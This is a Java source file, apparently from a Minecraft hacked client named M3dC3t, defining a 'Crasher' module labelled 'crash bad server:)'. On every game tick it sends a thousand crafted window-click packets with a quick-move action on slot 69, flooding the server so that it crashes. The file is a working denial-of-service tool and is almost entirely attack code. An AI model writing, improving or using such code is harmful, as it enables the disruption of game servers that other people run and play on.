package dev.madcat.m3dc3t.features.modules.misc;

import dev.madcat.m3dc3t.M3dC3t;
import dev.madcat.m3dc3t.features.modules.Module;
import dev.madcat.m3dc3t.features.modules.client.HUD;
import dev.madcat.m3dc3t.features.setting.Setting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.util.EnumHand;

public class Crasher
        extends Module {
    private final Setting<Boolean> escoff = this.register(new Setting<Boolean>("Disable", true));

    public Crasher() {
        super("Crasher", "crash bad server:).", Category.MISC, true, false, false);
    }

    @Override
    public void onLogout() {
        if (this.escoff.getValue().booleanValue() && M3dC3t.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }

    @Override
    public void onLogin() {
        if (this.escoff.getValue().booleanValue() && M3dC3t.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }

    @Override
    public void onTick() {
        if (Crasher.fullNullCheck()) {
            return;
        }
            for (int j = 0; j < 1000; ++j) {
                ItemStack item = new ItemStack(Crasher.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short) 1);
                Crasher.mc.player.connection.sendPacket((Packet)packet);
            }
    }
}

